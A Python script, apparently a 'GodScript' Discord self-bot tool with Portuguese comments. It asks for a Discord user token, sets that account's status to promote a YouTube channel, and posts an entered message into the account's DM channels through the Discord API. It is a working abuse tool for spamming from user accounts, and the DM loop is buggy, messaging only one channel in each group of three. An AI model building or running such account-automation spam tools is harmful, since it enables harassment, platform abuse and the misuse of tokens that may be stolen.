import requests
import threading
import os
import json
import discord
from colorama import Fore

intents = discord.Intents.default()
intents.members = True

client = discord.Client(intents=intents)

# Lê a linguagem selecionada pelo usuário no main.py
with open("language.txt", "r") as f:
    language = f.read().strip()

# Lê as mensagens do arquivo de idioma selecionado pelo usuário
if language == "en":
    lang_file = "lang/en.json"
elif language == "pt":
    lang_file = "lang/pt.json"

with open(lang_file, "r") as f:
    messages = json.load(f)


print(""" 
               .---._
           .--(. '  .).--.      . .-.
        . ( ' _) .)` (   .)-. ( ) '-'
       ( ,  ).        `(' . _)
     (')  _________      '-'
     ____[_________]                                         ________
     \__/ | _ \  ||    ,;,;,,                               [________]
     _][__|(")/__||  ,;;;;;;;;,   __________   __________   _| LILI |_
    /             | |____      | |          | |  ___     | |      ____|
   (| .--.    .--.| |     ___  | |   |  |   | |      ____| |____      |
   /|/ .. \~~/ .. \_|_.-.__.-._|_|_.-:__:-._|_|_.-.__.-._|_|_.-.__.-._|
+=/_|\ '' /~~\ '' /=+( o )( o )+==( o )( o )=+=( o )( o )+==( o )( o )=+=
='=='='--'==+='--'===+'-'=='-'==+=='-'+='-'===+='-'=='-'==+=='-'=+'-'jgs+

 """)

@client.event
async def on_ready():
    print(f'Logged in as {client.user} (ID: {client.user.id})')
    await client.change_presence(activity=discord.Game(name="GodScript no topo"))


def change_presence(token):
    payload = {
        "custom_status": {
            "text": messages["status_text"],
            "emoji_name": messages["status_emoji_name"],
            "emoji_id": messages["status_emoji_id"]
        },
        "activities": [{
            "name": "YouTube",
            "type": 4,
            "url": "https://www.youtube.com/@godscript"
        }]
    }
    headers = {"Authorization": token}
    r = requests.put("https://discord.com/api/v9/users/@me/settings", headers=headers, json=payload)
    if r.status_code == 200:
        print(f"{Fore.YELLOW}[{Fore.LIGHTGREEN_EX}!{Fore.YELLOW}]{Fore.WHITE} {messages['status_changed']}")
    else:
        print(f"{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} {messages['status_error']}")


def send_dm(token, message):
    processes = []
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers={"Authorization": token})
    if not channelIds.json():
        print(f"{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} {messages['no_dms']}")
        input(f"\n{Fore.YELLOW}[{Fore.BLUE}#{Fore.YELLOW}]{Fore.WHITE} {messages['press_enter']}")

    for channel in [channelIds.json()[i:i+3] for i in range(0, len(channelIds.json()), 3)]:
        for user in [x["username"]+"#"+x["discriminator"] for x in channel[0]["recipients"]]:
            try:
                requests.post(f'https://discord.com/api/v9/channels/{channel[0]["id"]}/messages',
                    headers={'Authorization': token},
                    json={"content": f"{message}"})
                print(f"{Fore.YELLOW}[{Fore.LIGHTGREEN_EX}!{Fore.YELLOW}]{Fore.WHITE} {messages['messaged']}: "+user+Fore.RESET)
            except Exception as e:
                print(f"{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} {messages['error_ignored']}: {e}")
    input(f"\n{Fore.YELLOW}[{Fore.BLUE}#{Fore.YELLOW}]{Fore.WHITE} {messages['press_enter']}")


def main():
    print(f"{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} {messages['enter_token']}")
    token = input(f"""{Fore.YELLOW}[{Fore.BLUE}#{Fore.YELLOW}]{Fore.WHITE} Token: """)
    print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} {messages['enter_message']}")
    message = str(input(f"{Fore.YELLOW}[{Fore.BLUE}#{Fore.YELLOW}]{Fore.WHITE} {messages['message']}: "))
    change_presence(token) # Altera o status do usuário
    send_dm(token, message)

if __name__ == "__main__":
    main()
